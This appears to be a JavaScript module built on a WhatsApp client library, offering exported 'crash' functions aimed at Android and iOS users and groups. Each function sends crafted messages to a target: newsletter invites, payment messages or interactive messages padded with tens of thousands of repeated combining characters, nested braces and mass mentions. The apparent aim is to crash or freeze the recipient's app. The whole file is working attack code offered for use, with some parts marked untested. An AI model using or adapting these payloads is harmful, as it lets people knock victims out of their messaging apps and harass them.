import { generateWAMessageFromContent } from '@nexustechpro/baileys';
import crypto from "crypto"
import chalk from "chalk";
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//GCCRASH FOR ANDROID
async function newsletterBvg(sock, X, Ptcp = true) {
  await sock.relayMessage(X, {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363319314627296@newsletter",
      newsletterName: "꙳͙͡༑ᐧ̤..... ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐙͢͠𝐄𝐑͠𝐎 ⃜  ꙳͙͡༑ᐧ" + "ཹ".repeat(130000),
      caption: "🍀TheZeroGetS3x" + "ោ៝".repeat(60000),
      inviteExpiration: "999999999"
    }
  }, Ptcp ? {
    participant: {
      jid: X
    }
  } : {});
}

//GCCRASH FOR IOS
async function newsletterBvg2(sock, X, Ptcp = true) {
  await sock.relayMessage(X, {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363319314627296@newsletter",
      newsletterName: "꙳͙͡༑ᐧ̤..... ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐙͢͠𝐄𝐑͠𝐎 ⃜  ꙳͙͡༑ᐧ" + "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
      caption: "🍀TheZeroGetS3x",
      inviteExpiration: "999999999"
    }
  }, Ptcp ? {
    participant: {
      jid: X
    }
  } : {});
}

//COMBINED CRASH - Calls both Android and iOS simultaneously
async function newsletterBvgCombo(sock, X, Ptcp = true) {
  await Promise.all([
    newsletterBvg(sock, X, Ptcp),
    newsletterBvg2(sock, X, Ptcp)
  ]);
}

/* calling the of function*/
// await newsletterBvgCombo(sock, "62xxx@s.whatsapp.net", true) // for number
// await newsletterBvgCombo(sock, "12345678@g.us", false) // for group

//ANDROID CRASH
async function AndroidCrash(sock, target) {
   await sock.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid: target }
  })
}
//DELAY ANDROID CRASH (NOT TESTED)
async function delayandroid(sock, target) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(77777),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "i wanna be yours" +
              "ꦽ".repeat(25000) +
              "ោ៝".repeat(20000),
          }, 
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            butons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
            ],
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(77777),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "secret" +
              "ꦽ".repeat(25000) +
              "ោ៝".repeat(20000),
          }, 
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            butons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
            ],
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        },
      },
    },
  }, { participant: { jid: target }, });
}
//IOS BUG(NOT TESTED BUT BUTTON WORKS)
async function blankIos(target) {
  await sock.relayMessage(
    target,
    {
      text: "✩",
      contentText: "✩",
      footer: "#..",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: `{"᬴".repeat(6)}`,
              sections: [
                {
                  title: "",
                  highlight_label: "label",
                  rows: []
                }
              ]
            })
          }
        }
      ],
      headerType: 1
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

export {
newsletterBvgCombo,
 AndroidCrash,
 blankIos
};